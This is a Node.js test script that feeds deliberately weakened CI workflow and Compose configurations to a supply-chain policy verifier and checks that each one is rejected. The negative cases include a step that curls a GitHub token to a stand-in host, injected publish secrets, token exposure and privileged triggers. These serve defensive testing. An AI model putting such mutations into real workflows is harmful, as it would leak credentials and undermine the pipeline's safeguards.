import { spawnSync } from 'node:child_process'
import {
  chmodSync,
  existsSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

import { parse, stringify } from 'yaml'

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const verifier = path.join(root, 'scripts/verify-test-image.mjs')
const temporaryDirectory = mkdtempSync(path.join(tmpdir(), 'document-ts-policy-'))

function writeYamlMutation(name, source, mutate) {
  const document = parse(readFileSync(path.join(root, source), 'utf8'))
  mutate(document)
  const target = path.join(temporaryDirectory, name)
  writeFileSync(target, stringify(document))
  return target
}

function writeJsonMutation(name, source, mutate) {
  const document = JSON.parse(readFileSync(path.join(root, source), 'utf8'))
  mutate(document)
  const target = path.join(temporaryDirectory, name)
  writeFileSync(target, `${JSON.stringify(document, null, 2)}\n`)
  return target
}

try {
  const composeExtraService = writeYamlMutation(
    'compose-extra-service.yml',
    'compose.test.yml',
    (document) => {
      document.services.rogue = { image: 'mongo:latest' }
    }
  )
  const composeBuild = writeYamlMutation(
    'compose-build.yml',
    'compose.test.yml',
    (document) => {
      document.services.mongodb.build = '.'
      document.services.mongodb.pull_policy = 'build'
    }
  )
  const composeInclude = writeYamlMutation(
    'compose-include.yml',
    'compose.test.yml',
    (document) => {
      document.include = [{ path: 'rogue-compose.yml' }]
    }
  )

  const ciPolicyFloatingImage = writeYamlMutation(
    'ci-policy-floating-image.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.policy.container.image = 'node:latest'
      document['x-policy-decoy'] =
        'node:22.23.2-bookworm@sha256:8a34c4ab3ea2c5cd194f07e317b2a8f09461d3c8b05c4e34c8ccd56d56024c4d'
    }
  )
  const ciFloatingService = writeYamlMutation(
    'ci-floating-service.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.build.services.mongodb.image = 'mongo:latest'
    }
  )
  const ciPolicyService = writeYamlMutation(
    'ci-policy-service.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.policy.services = {
        mongodb: { image: document.jobs.build.services.mongodb.image },
      }
    }
  )
  const ciPolicyCache = writeYamlMutation(
    'ci-policy-cache.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.policy.steps.splice(2, 0, {
        uses: `actions/cache@${'a'.repeat(40)}`,
        with: { path: 'node_modules', key: 'mutable' },
      })
    }
  )
  const ciNoopPolicy = writeYamlMutation(
    'ci-noop-policy.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.policy.steps = [{ run: 'echo no-op' }]
    }
  )
  const ciBuildWithoutPolicy = writeYamlMutation(
    'ci-build-without-policy.yml',
    '.github/workflows/ci.yml',
    (document) => {
      delete document.jobs.build.needs
    }
  )
  const ciExtraJob = writeYamlMutation(
    'ci-extra-job.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.rogue = {
        name: 'Rogue',
        'runs-on': 'ubuntu-latest',
        steps: [{ run: 'curl https://example.invalid' }],
      }
    }
  )
  const ciFloatingAction = writeYamlMutation(
    'ci-floating-action.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.policy.steps[0].uses = 'actions/checkout@v7'
    }
  )
  const ciPersistedCredentials = writeYamlMutation(
    'ci-persisted-credentials.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.policy.steps[0].with['persist-credentials'] = true
    }
  )
  const ciWritePermissions = writeYamlMutation(
    'ci-write-permissions.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.permissions.contents = 'write'
    }
  )
  const ciOidc = writeYamlMutation(
    'ci-oidc.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.permissions['id-token'] = 'write'
    }
  )
  const ciSecret = writeYamlMutation(
    'ci-secret.yml',
    '.github/workflows/ci.yml',
    (document) => {
      const credentialName = ['NPM', 'TOKEN'].join('_')
      document.jobs.build.env[credentialName] = `\${{ secrets.${credentialName} }}`
    }
  )
  const ciGitHubToken = writeYamlMutation(
    'ci-github-token.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.build.steps[4].env = {
        GH_TOKEN: '${{ github.token }}',
      }
    }
  )
  const ciPublish = writeYamlMutation(
    'ci-publish.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.build.steps[5].run = 'npm publish'
    }
  )
  const ciArtifactBeforeGate = writeYamlMutation(
    'ci-artifact-before-gate.yml',
    '.github/workflows/ci.yml',
    (document) => {
      const [upload] = document.jobs.build.steps.splice(6, 1)
      document.jobs.build.steps.splice(4, 0, upload)
    }
  )
  const ciArtifactOverwrite = writeYamlMutation(
    'ci-artifact-overwrite.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.build.steps.at(-1).with.overwrite = true
    }
  )
  const ciArtifactWithoutRunIdentity = writeYamlMutation(
    'ci-artifact-without-run-identity.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.build.steps.at(-1).with.name = 'ci-package'
    }
  )
  const ciPackageInsideInput = writeYamlMutation(
    'ci-package-inside-input.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.build.steps[5].run = [
        'npm pack --pack-destination ci-package',
        'npm run release:verify',
      ].join('\n')
      document.jobs.build.steps.at(-1).with.path = 'ci-package/'
    }
  )
  const ciPackageWithoutVerification = writeYamlMutation(
    'ci-package-without-verification.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.build.steps[5].run = 'npm run release:pack'
    }
  )
  const ciLatestRunner = writeYamlMutation(
    'ci-latest-runner.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.build['runs-on'] = 'ubuntu-latest'
    }
  )
  const ciNoTimeout = writeYamlMutation(
    'ci-no-timeout.yml',
    '.github/workflows/ci.yml',
    (document) => {
      delete document.jobs.build['timeout-minutes']
    }
  )
  const ciContainerCredentials = writeYamlMutation(
    'ci-container-credentials.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.policy.container.credentials = {
        username: 'runner',
        password: '${{ github.token }}',
      }
    }
  )
  const ciRenamedCheck = writeYamlMutation(
    'ci-renamed-check.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.policy.name = 'Policy maybe'
    }
  )
  const ciPrivilegedTrigger = writeYamlMutation(
    'ci-privileged-trigger.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.on.pull_request_target = null
    }
  )
  const ciAlwaysBuild = writeYamlMutation(
    'ci-always-build.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.build.if = 'always()'
    }
  )
  const ciWildcardSafeDirectory = writeYamlMutation(
    'ci-wildcard-safe-directory.yml',
    '.github/workflows/ci.yml',
    (document) => {
      document.jobs.policy.steps[1].run = 'git config --global --add safe.directory "*"'
    }
  )

  const noEgressAlways = writeYamlMutation(
    'no-egress-always.yml',
    '.github/workflows/no-egress-integration.yml',
    (document) => {
      document.jobs.test.if = 'always()'
    }
  )
  const noEgressContainer = writeYamlMutation(
    'no-egress-container.yml',
    '.github/workflows/no-egress-integration.yml',
    (document) => {
      document.jobs.test.container = { image: 'node:latest' }
    }
  )
  const noEgressPolicyService = writeYamlMutation(
    'no-egress-policy-service.yml',
    '.github/workflows/no-egress-integration.yml',
    (document) => {
      document.jobs.policy.services = { mongodb: { image: 'mongo:latest' } }
    }
  )
  const noEgressExtraJob = writeYamlMutation(
    'no-egress-extra-job.yml',
    '.github/workflows/no-egress-integration.yml',
    (document) => {
      document.jobs.rogue = {
        name: 'Rogue',
        'runs-on': 'ubuntu-latest',
        steps: [{ uses: 'docker://mongo:latest' }],
      }
    }
  )
  const noEgressImageEnv = writeYamlMutation(
    'no-egress-image-env.yml',
    '.github/workflows/no-egress-integration.yml',
    (document) => {
      document.jobs.test.env.NODE_IMAGE = 'node:latest'
    }
  )
  const noEgressFloatingCheckout = writeYamlMutation(
    'no-egress-floating-checkout.yml',
    '.github/workflows/no-egress-integration.yml',
    (document) => {
      document.jobs.policy.steps[0].uses = 'actions/checkout@v7'
    }
  )
  const noEgressWithoutPolicy = writeYamlMutation(
    'no-egress-without-policy.yml',
    '.github/workflows/no-egress-integration.yml',
    (document) => {
      delete document.jobs.test.needs
    }
  )
  const maintenanceOldCheckout = writeYamlMutation(
    'maintenance-old-checkout.yml',
    '.github/workflows/toolchain-maintenance.yml',
    (document) => {
      document.jobs.lifecycle.steps[0].uses =
        'actions/checkout@11d5960a326750d5838078e36cf38b85af677262'
    }
  )
  const maintenanceFloatingSetup = writeYamlMutation(
    'maintenance-floating-setup.yml',
    '.github/workflows/toolchain-maintenance.yml',
    (document) => {
      document.jobs.lifecycle.steps[1].uses = 'actions/setup-node@v7'
    }
  )
  const maintenanceWithoutCondition = writeYamlMutation(
    'maintenance-without-condition.yml',
    '.github/workflows/toolchain-maintenance.yml',
    (document) => {
      delete document.jobs.lifecycle.steps.at(-1).if
    }
  )
  const maintenanceTokenEgress = writeYamlMutation(
    'maintenance-token-egress.yml',
    '.github/workflows/toolchain-maintenance.yml',
    (document) => {
      document.jobs.lifecycle.steps.at(-1).run +=
        '\ncurl -H "Authorization: $GH_TOKEN" https://example.invalid'
    }
  )
  const maintenanceSkippedCheck = writeYamlMutation(
    'maintenance-skipped-check.yml',
    '.github/workflows/toolchain-maintenance.yml',
    (document) => {
      document.jobs.lifecycle.steps[2].run = 'echo "status=0" >> "$GITHUB_OUTPUT"'
    }
  )
  const maintenanceCancelledRuns = writeYamlMutation(
    'maintenance-cancelled-runs.yml',
    '.github/workflows/toolchain-maintenance.yml',
    (document) => {
      document.concurrency['cancel-in-progress'] = true
    }
  )
  const maintenanceArbitraryIssueMutation = writeYamlMutation(
    'maintenance-arbitrary-issue-mutation.yml',
    '.github/workflows/toolchain-maintenance.yml',
    (document) => {
      document.jobs['container-digests'].steps.at(-1).run =
        'gh issue close 1 --comment "unreviewed mutation"'
    }
  )
  const releaseFloatingService = writeYamlMutation(
    'release-floating-service.yml',
    '.github/workflows/release.yml',
    (document) => {
      document.jobs.build.services.mongodb.image = 'mongo:latest'
    }
  )

  const mismatchedMatrix = writeJsonMutation(
    'support-matrix-image-mismatch.json',
    'support-matrix.json',
    (document) => {
      document.tuples[0].nodeImage = `example.invalid/node:${document.tuples[0].node}-bookworm@sha256:${'a'.repeat(64)}`
    }
  )
  const multiTupleMatrix = writeJsonMutation(
    'support-matrix-extra-tuple.json',
    'support-matrix.json',
    (document) => {
      document.tuples.push({ ...document.tuples[0], id: 'untested-extra' })
    }
  )
  const mismatchedCheckoutRuntime = writeJsonMutation(
    'support-matrix-checkout-runtime-mismatch.json',
    'support-matrix.json',
    (document) => {
      document.githubActions.checkout.revision = 'a'.repeat(40)
    }
  )

  const invalidCases = [
    {
      args: ['--image', 'mongo:7.0.40'],
      expected: 'expected an exact version and digest',
    },
    {
      args: ['--image', `mongo:7.0.40@sha256:${'a'.repeat(64)}`],
      expected: 'candidate does not match',
    },
    {
      args: ['--compose-config', 'tests/fixtures/compose-image-semantic-bypass.yml'],
      expected: 'local Compose must exactly match',
    },
    {
      args: ['--compose-config', 'tests/fixtures/compose-image-tagged.yml'],
      expected: 'cannot use YAML tags or ambiguous constructs',
    },
    {
      args: ['--ci-workflow', 'tests/fixtures/github-actions-command-decoy.yml'],
      expected: 'unreviewed or floating action',
    },
    {
      args: ['--no-egress-workflow', 'tests/fixtures/no-egress-command-decoy.yml'],
      expected: 'retain reviewed triggers',
    },
    { args: ['--compose-config', composeExtraService], expected: 'local Compose' },
    { args: ['--compose-config', composeBuild], expected: 'local Compose' },
    { args: ['--compose-config', composeInclude], expected: 'local Compose' },
    {
      args: ['--ci-workflow', ciPolicyFloatingImage],
      expected: 'CI policy job container must exactly match',
    },
    {
      args: ['--ci-workflow', ciFloatingService],
      expected: 'CI MongoDB service must exactly use',
    },
    {
      args: ['--ci-workflow', ciPolicyService],
      expected: 'independent service-free gate',
    },
    {
      args: ['--ci-workflow', ciPolicyCache],
      expected: 'cannot restore mutable dependency caches',
    },
    {
      args: ['--ci-workflow', ciNoopPolicy],
      expected: 'exactly 2 reviewed checkout',
    },
    {
      args: ['--ci-workflow', ciBuildWithoutPolicy],
      expected: 'must require the policy job',
    },
    {
      args: ['--ci-workflow', ciExtraJob],
      expected: 'exactly the stable policy and build jobs',
    },
    {
      args: ['--ci-workflow', ciFloatingAction],
      expected: 'unreviewed or floating action',
    },
    {
      args: ['--ci-workflow', ciPersistedCredentials],
      expected: 'must disable persisted credentials',
    },
    {
      args: ['--ci-workflow', ciWritePermissions],
      expected: 'least-privilege permissions',
    },
    {
      args: ['--ci-workflow', ciOidc],
      expected: 'least-privilege permissions',
    },
    {
      args: ['--ci-workflow', ciSecret],
      expected: 'privileged triggers, credentials, or publication',
    },
    {
      args: ['--ci-workflow', ciGitHubToken],
      expected: 'cannot expose the GitHub token',
    },
    {
      args: ['--ci-workflow', ciPublish],
      expected: 'privileged triggers, credentials, or publication',
    },
    {
      args: ['--ci-workflow', ciArtifactBeforeGate],
      expected: 'reviewed gate and evidence sequence',
    },
    {
      args: ['--ci-workflow', ciArtifactOverwrite],
      expected: 'immutable, run-scoped reviewed artifacts',
    },
    {
      args: ['--ci-workflow', ciArtifactWithoutRunIdentity],
      expected: 'immutable, run-scoped reviewed artifacts',
    },
    {
      args: ['--ci-workflow', ciPackageInsideInput],
      expected: 'create and verify reviewable release evidence',
    },
    {
      args: ['--ci-workflow', ciPackageWithoutVerification],
      expected: 'create and verify reviewable release evidence',
    },
    {
      args: ['--ci-workflow', ciLatestRunner],
      expected: 'reviewed ubuntu-24.04 runner',
    },
    {
      args: ['--ci-workflow', ciNoTimeout],
      expected: 'reviewed timeout',
    },
    {
      args: ['--ci-workflow', ciContainerCredentials],
      expected: 'cannot expose the GitHub token',
    },
    {
      args: ['--ci-workflow', ciRenamedCheck],
      expected: 'stable check name',
    },
    {
      args: ['--ci-workflow', ciPrivilegedTrigger],
      expected: 'only the reviewed pull request',
    },
    {
      args: ['--ci-workflow', ciAlwaysBuild],
      expected: 'cannot bypass failures',
    },
    {
      args: ['--ci-workflow', ciWildcardSafeDirectory],
      expected: 'exactly match the reviewed service-free gate',
    },
    { args: ['--no-egress-workflow', noEgressAlways], expected: 'cannot bypass' },
    {
      args: ['--no-egress-workflow', noEgressContainer],
      expected: 'isolated Docker network explicitly',
    },
    {
      args: ['--no-egress-workflow', noEgressPolicyService],
      expected: 'independent service-free gate',
    },
    {
      args: ['--no-egress-workflow', noEgressExtraJob],
      expected: 'unreviewed or floating action',
    },
    {
      args: ['--no-egress-workflow', noEgressImageEnv],
      expected: 'isolated resource names',
    },
    {
      args: ['--no-egress-workflow', noEgressFloatingCheckout],
      expected: 'unreviewed or floating action',
    },
    {
      args: ['--no-egress-workflow', noEgressWithoutPolicy],
      expected: 'must require the policy job',
    },
    {
      args: ['--maintenance-workflow', maintenanceOldCheckout],
      expected: 'unreviewed or floating action',
    },
    {
      args: ['--maintenance-workflow', maintenanceFloatingSetup],
      expected: 'unreviewed or floating action',
    },
    {
      args: ['--maintenance-workflow', maintenanceWithoutCondition],
      expected: 'exactly match the reviewed issue-write contract',
    },
    {
      args: ['--maintenance-workflow', maintenanceTokenEgress],
      expected: 'exactly match the reviewed issue-write contract',
    },
    {
      args: ['--maintenance-workflow', maintenanceSkippedCheck],
      expected: 'exactly match the reviewed issue-write contract',
    },
    {
      args: ['--maintenance-workflow', maintenanceCancelledRuns],
      expected: 'exactly match the reviewed issue-write contract',
    },
    {
      args: ['--maintenance-workflow', maintenanceArbitraryIssueMutation],
      expected: 'exactly match the reviewed issue-write contract',
    },
    {
      args: ['--release-workflow', releaseFloatingService],
      expected: 'release MongoDB service must exactly match',
    },
    {
      args: ['--matrix', mismatchedMatrix],
      expected: 'Node image repository and tag must match',
    },
    {
      args: ['--matrix', multiTupleMatrix],
      expected: 'exactly one continuously tested tuple',
    },
    {
      args: ['--matrix', mismatchedCheckoutRuntime],
      expected: 'identity and runtime must match the reviewed support policy',
    },
  ]

  for (const testCase of invalidCases) {
    const result = spawnSync(process.execPath, [verifier, ...testCase.args], {
      cwd: root,
      encoding: 'utf8',
    })
    if (result.status === 0) {
      throw new Error(
        `Image-policy negative case unexpectedly passed: ${testCase.args.join(' ')}`
      )
    }
    if (!result.stderr.includes(testCase.expected)) {
      throw new Error(
        `Image-policy case failed for the wrong reason (${testCase.args.join(' ')}):\n${result.stderr}`
      )
    }
  }

  const marker = path.join(temporaryDirectory, 'docker-called')
  const stub = path.join(temporaryDirectory, 'docker-stub')
  writeFileSync(stub, `#!/bin/sh\ntouch "${marker}"\nexit 99\n`)
  chmodSync(stub, 0o700)
  const result = spawnSync(
    process.execPath,
    [path.join(root, 'scripts/start-test-mongodb.mjs')],
    {
      cwd: root,
      encoding: 'utf8',
      env: {
        ...process.env,
        DOCUMENT_TS_DOCKER_COMMAND: stub,
        DOCUMENT_TS_TEST_COMPOSE_FILE: composeExtraService,
      },
    }
  )
  if (result.status === 0) throw new Error('Invalid local Compose policy passed')
  if (existsSync(marker)) {
    throw new Error('Docker was invoked before the invalid Compose image was rejected')
  }

  console.log(
    `Rejected ${invalidCases.length} invalid image-policy cases for their expected reasons before startup.`
  )
} finally {
  rmSync(temporaryDirectory, { force: true, recursive: true })
}
